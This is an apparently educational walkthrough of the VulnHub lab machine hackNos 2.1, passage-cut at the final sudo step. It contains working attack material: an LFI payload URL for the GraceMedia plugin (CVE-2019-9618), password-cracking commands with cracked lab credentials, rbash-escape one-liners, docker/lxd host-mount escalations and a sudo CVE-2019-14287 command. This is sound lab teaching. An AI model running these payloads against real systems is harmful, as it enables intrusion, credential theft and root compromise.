# hackNos: Os-hackNos-2.1 (VulnHub) — A Beginner-Friendly Walkthrough

| Field | Value |
|---|---|
| **Machine** | hackNos: Os-hackNos-2.1 |
| **Difficulty** | **3 — Easy** (stated: *Easy / Intermediate*) |
| **Author** | Rahul Gehlaut (hackNos) |
| **Released** | 29 November 2019 (v1.1 on 13 December 2019) |
| **VulnHub Entry** | https://vulnhub.com/entry/hacknos-os-hacknos-21,403/ |
| **Download** | https://vulnhub.com/entry/hacknos-os-hacknos-21,403/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, Apache 2.4 + WordPress + PHP) |

> **Note on the network:** every command below assumes the Kali attacker is
> `192.168.56.10` and the hackNos-2.1 VM is `192.168.56.101`. Substitute your own
> IPs if your host-only network uses a different range. The box ships as `.ova`;
> import it and put both VMs on the same host-only network.

> **Goal:** capture two flags — the **user** flag (`/home/rohit/user.txt`) and the
> **root** flag (`/root/root.txt`). The author notes exact usernames/passwords vary
> slightly between the v1.0 and v1.1 builds.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this walkthrough you will have practised, on a real (but safe,
offline) target:

1. **Host discovery** and **port scanning**.
2. **Web directory enumeration** — finding a hidden WordPress site.
3. **Nikto/`dirb`** for spotting interesting web paths.
4. **WordPress enumeration with `wpscan`** — usernames and vulnerable plugins.
5. **Local File Inclusion (LFI)** — reading `/etc/passwd` through a vulnerable
   plugin (**CVE-2019-9618**).
6. **Offline password cracking with John the Ripper** — reversing MD5-crypt
   hashes.
7. **Getting a shell over SSH** and escaping a **restricted shell (`rbash`)**.
8. **Post-exploitation enumeration** — finding a world-readable backup of
   password hashes.
9. **Lateral movement** — switching users with `su`.
10. **Privilege escalation via `sudo`** — abusing `(ALL:ALL) ALL`.

> **The intended chain in one breath:** nmap finds SSH (22) and HTTP (80) →
> `dirb`/`nikto` reveal `/tsweb/`, a WordPress site → `wpscan` shows the plugin
> **gracemedia-media-player 1.0** → the plugin's `cfg` parameter is an **LFI** →
> we read `/etc/passwd` and grab the `flag` user's hash → **John** cracks it →
> SSH in as `flag` (but it's a restricted `rbash`) → escape the shell → read
> `/var/backups/passbkp/md5-hash`, crack `rohit`'s hash → `su rohit` → `sudo -l`
> shows `(ALL:ALL) ALL` → `sudo /bin/bash` → root.

---

## 1. Reconnaissance — finding the target

### 1.1 Identify your own IP

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists every interface and its address. Our attacker is
> `192.168.56.10/24`, so the whole subnet is `192.168.56.0–255`.

### 1.2 Sweep the subnet for the target


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.
   IP            At MAC Address     Count  Len  MAC Vendor
 192.168.56.1    08:00:27:xx:xx:xx   1    60  PCS Systemtechnik GmbH
 192.168.56.10   08:00:27:aa:aa:aa   1    60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:bb:bb:bb   1    60  PCS Systemtechnik GmbH   <-- target
```

`arp-scan` works too:

```bash
sudo arp-scan --interface=eth0 --localnet
```

> **Why it works:** both tools ARP-sweep the local subnet and list every host that
> answers. Lab VMs live on your local network, so this is the fastest way to find
> the target.

**Target confirmed: `192.168.56.101`.**

![Finding the target IP](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Scan for open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- -oN hacknos21.nmap 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:** `-p-` scans all ports, `-sV` fingerprints versions, and `-sC`
> runs default scripts. Only **SSH (22)** and **HTTP (80)** are open. With no
> credentials, the web server is our entry point.

*(Version strings vary slightly by build — trust your own scan.)*

### 2.2 Look at the web server

```bash
curl -s http://192.168.56.101/ | head
```

```text
<title>Apache2 Ubuntu Default Page: It works</title>
```

An empty default page means the real content is in a **directory we haven't found
yet**. Enumerate.

### 2.3 Directory busting and Nikto


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.101/
```

```text
+ http://192.168.56.101/index.html   (CODE:200|SIZE:10918)
+ http://192.168.56.101/tsweb/       (CODE:301|SIZE:312)
```

Nikto also flags it:

```bash
nikto -h http://192.168.56.101/
```

```text
+ /tsweb/: WordPress version 5.x identified.
```

> **Why it works:** `dirb` requests common paths and reports non-404 responses;
> `nikto` adds web-specific checks. Both point at **`/tsweb/`**, which is running
> **WordPress**. Note the non-standard path — the default `/wordpress/` guess would
> have missed it.

Browsing `http://192.168.56.101/tsweb/` shows a WordPress blog.

![dirb/Nikto finding the /tsweb WordPress site](images/02-dirb.png)

### 2.4 Enumerate WordPress with wpscan

`wpscan` can list users and plugins in one pass:


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.101/tsweb/ -e u,p
```

```text
[+] Enumerating Users ...
[+] user
    Confirmed By: Author ID Brute Forcing - Author Pattern
[+] Enumerating Plugins ...
[+] gracemedia-media-player
 | Location: http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/
 | Latest Version: 1.0 (up to date)
 | Version: 1.0 (100% confidence)
```

> **Why it works:**
> - `-e u` enumerates **usernames** (WordPress leaks them via author archives and
>   the REST API). We get the username **`user`**.
> - `-e p` enumerates **plugins**. WordPress sites almost always run third-party
>   plugins, and old plugins are the most common way in. We find
>   **`gracemedia-media-player` version 1.0**.

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: CVE-2019-9618 (Local File Inclusion)

The GraceMedia Media Player plugin 1.0 has a file that passes a user parameter
straight into PHP's `require_once()`:

```php
require_once($_GET['cfg']);
```

There is no validation of `cfg`, so an attacker can point it at **any file on the
server** — a classic **Local File Inclusion (LFI)**.

> **Why it works:** `require_once($_GET['cfg'])` asks PHP to "load the file whose
> path is in the `cfg` parameter." Because we control `cfg` and there is no
> allow-list, we can walk up the directory tree with `../` and read system files.
> If we can read `/etc/passwd`, we can find usernames and, if the hashes are
> exposed there, crack them offline.

### 3.2 Read /etc/passwd through the LFI

The vulnerable endpoint (URL-encode nothing — it works as shown):

```
http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
```

Or with `curl`:

```bash
curl -s "http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd"
```


> ### 📖 Concept — Escaping a restricted shell
>
> **`rbash`** (restricted bash) is bash started with `--restricted`. It blocks:
> changing directory (`cd`), setting or unsetting `SHELL`/`PATH`/`ENV`/`BASH_ENV`,
> command names containing `/`, output redirection with `>`, and `exec`/`source` of
> absolute paths.
>
> It is a *shell* restriction, not a security boundary — it only constrains that one
> process. **Anything that spawns a fresh shell escapes it.** Work through these:
>
> ```bash
> # 1. Does any permitted command spawn a shell?
> vim -c ':!sh'            # or :set shell=/bin/bash  then :shell
> less /etc/passwd         # then type !sh
> more, man (then !sh), ftp (!/bin/sh), gdb (-ex '!sh'), awk ('BEGIN{system("/bin/sh")}')
> find . -exec /bin/sh \; -quit
>
> # 2. Can you run an interpreter at all?
> python -c 'import os; os.system("/bin/sh")'
> perl -e 'exec "/bin/sh";'
> php -r "system('/bin/sh');"
>
> # 3. Is SSH available with a command override?
> ssh user@target -t "/bin/sh"          # -t forces a tty, bypassing the login shell
> ssh user@target -t "bash --noprofile --norc"
>
> # 4. Is the restriction only in the profile?
> bash --noprofile --norc               # a clean, unrestricted bash
> export SHELL=/bin/bash                # if you can reach env at all
>
> # 5. Can you write a file and execute it another way?
> echo '/bin/sh' > /tmp/x.sh            # redirection is often blocked — try tee
> ```
>
> **Check what you actually have first.** `echo $0` shows the shell; `set -o` lists
> options (look for `restricted on`); `echo $PATH` shows whether it is pinned;
> `compgen -c | head -50` lists runnable commands.
>
> **The general principle:** a restricted shell limits *one process*. Find any child
> process it lets you create, and the restriction does not apply there.
>
> **Deep dive:** [CONCEPTS §12 — Shells](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```text
root:x:0:0:root:/root:/bin/bash
...
rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash
...
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash
```

> **Why it works:** the response is the full contents of `/etc/passwd`. Two real
> accounts stand out: **`rohit`** and **`flag`**. Notice the `flag` line has a
> **hash in the password field** (`$1$flag$...`) — that's MD5-crypt (`$1$`,
> "crypt(3) MD5"). And its shell is `/bin/rbash`, a **restricted** Bash.
> *(The exact hash differs between builds.)*

![LFI reading /etc/passwd](images/03-lfi-passwd.png)

### 3.3 Crack the hash with John the Ripper

Save the `flag` line's hash to a file and crack it:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
echo 'flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash' > flag_hash
john --wordlist=/usr/share/wordlists/rockyou.txt flag_hash
john --show flag_hash
```

```text
topsecret        (?)
1 password hash cracked, 0 left
```

> **Why it works:** `$1$` hashes are **fast** to compute, so a wordlist attack
> against a weak password succeeds quickly. `rockyou.txt` is the classic Kali
> wordlist. John recovers the password **`topsecret`** for the `flag` user.
> *(Different builds may yield a different password — always crack your own.)*

### 3.4 SSH in as flag

```bash
ssh flag@192.168.56.101
# password: topsecret
```

```text
Could not chdir to home directory /home/flag: No such file or directory
flag@hacknos:/$ id
uid=1001(flag) gid=1003(flag) groups=1003(flag)
```

> **Why it works:** the cracked password is reused on SSH. We now have a shell —
> but `flag`'s shell is **`rbash`**, a *restricted* Bash that blocks `cd`, changes
> to `PATH`, and absolute-path commands.

### 3.5 Escape the restricted shell (rbash)

`rbash` restricts what the *initial* shell can do, but it cannot stop us from
starting a **new, unrestricted** one with a program it still allows. A reliable
trick is to spawn a normal Bash through Python:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```text
flag@hacknos:/$ cd /home
cd: restricted
```

If `python3` is blocked, alternatives include `ssh -t flag@192.168.56.101 bash`
(ask SSH to launch `bash` directly) or using `vi`/`less` to escape. Whichever
works, you now have a full Bash prompt.

> **Why it works:** `rbash` only restricts the shell it *starts with*. Any allowed
> program that can launch another shell (Python's `pty.spawn`, `vi`'s `:shell`,
> `less`'s `!sh`, or SSH's `-t` command argument) gives you an **unrestricted**
> shell with the same user rights.

![Escaping the rbash restricted shell](images/04-rbash-escape.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Enumerate for more credentials

With a proper shell, look at the obvious places. A very common CTF clue is a
**backup of password hashes**:

```bash
ls -la /var/backups/
ls -la /var/backups/passbkp/
cat /var/backups/passbkp/md5-hash
```

```text
/var/backups/passbkp/md5-hash
```

```text
rohit:$1$rohit$hKv6......:1000:1000:hackNos:/home/rohit:/bin/bash
```

> **Why it works:** a file literally named `md5-hash` inside a `passbkp`
> ("password backup") directory is a giant neon clue. It contains another
> MD5-crypt hash — this time for the user **`rohit`**.

### 4.2 Crack rohit's hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt rohit_hash
john --show --format=md5crypt rohit_hash
```

```text
rohit:!%hack41
```

> **Why it works:** the hash is again `$1$` MD5-crypt; `--format=md5crypt` tells
> John exactly which algorithm to use. The password **`!%hack41`** falls to the
> wordlist. *(Password varies by build — crack your own copy.)*

### 4.3 Switch to rohit

```bash
su - rohit
# password: !%hack41
```


> ### 📖 Concept — `docker`, `lxd` and `disk` group membership *is* root
>
> ```bash
> id | grep -oE 'docker|lxd|libvirt|disk|sudo|wheel|adm'
> ```
>
> If any of `docker`, `lxd`, `libvirt` or `disk` appears, **you already have root.**
> There is no nuance: a member can mount the host filesystem or start a privileged
> container, and from there it is a one-line `echo >> /etc/passwd`.
>
> **Why.** Containers share the *host kernel*. A container marked
> `security.privileged=true` does not drop capabilities and runs its init as **real
> UID 0**, and a container can be given a disk device that bind-mounts the host's `/`.
> Put those together and a low-privileged user says: *start a root container, mount
> the host filesystem at `/mnt/root`, edit `/mnt/root/etc/passwd`.* No isolation is
> left.
>
> ```bash
> # docker — the host root, chrooted into
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
>
> # docker.sock — talk to the daemon directly, no CLI needed
> curl --unix-socket /var/run/docker.sock -X POST \
>   "http://localhost/containers/create?name=pwn" -H 'Content-Type: application/json' \
>   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
>
> # lxd — build an image on Kali, carry it over, mount the host
> lxc image import ./alpine.tar.gz --alias myimage
> lxc init myimage pwn -c security.privileged=true
> lxc config device add pwn mydev disk source=/ path=/mnt/root recursive=true
> lxc start pwn && lxc exec pwn /bin/sh      # /mnt/root is now the HOST's /
> ```
>
> `-c security.privileged=true` is the flag that makes this an escalation rather than
> a sandbox. `source=/` is the host's entire root filesystem.
>
> **Defensive corollary:** never add a web-server or service account to a container
> group. If an application genuinely must launch containers, give it a scoped API
> token in a restricted project — not group membership.
>
> **Deep dive:** [CONCEPTS §15.9 — Container and group escapes](../../docs/CONCEPTS.md#159-container-and-group-escapes)

```text
rohit@hacknos:~$ id
uid=1000(rohit) gid=1000(rohit) groups=1000(rohit),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
rohit@hacknos:~$ cat user.txt
```

```text
Congratulations, you have found the user flag. <user flag here>
```

> **Why it works:** `rohit` is a normal user with a home directory, and we now
> have his password. The user flag lives in his home directory. Notice the groups:
> **`sudo`** is there — that's the final step.

### 4.4 Check sudo rights and escalate


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
[sudo] password for rohit: !%hack41
Matching Defaults entries for rohit on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User rohit may run the following commands on hacknos:
    (ALL : ALL) ALL
```

> **Why it works:** `sudo -l` lists exactly what `rohit` may run as root.
> **`(ALL : ALL) ALL`** means rohit may run **any command as any user** — i.e.
